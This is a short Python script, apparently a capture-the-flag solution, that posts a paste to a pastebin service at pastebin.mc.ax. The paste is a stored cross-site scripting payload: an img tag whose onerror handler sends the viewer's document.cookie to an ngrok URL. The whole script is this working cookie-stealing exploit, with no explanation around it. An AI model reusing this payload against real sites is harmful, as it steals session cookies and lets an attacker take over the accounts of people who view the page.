import requests

URL="https://pastebin.mc.ax/"

s = requests.Session()
payload = "<img src=x onerror=document.location='https://2a01-126-151-102-16.jp.ngrok.io?c='+document.cookie//"
res = s.post(URL+"new", data={"paste":payload})
print(res.request.url)
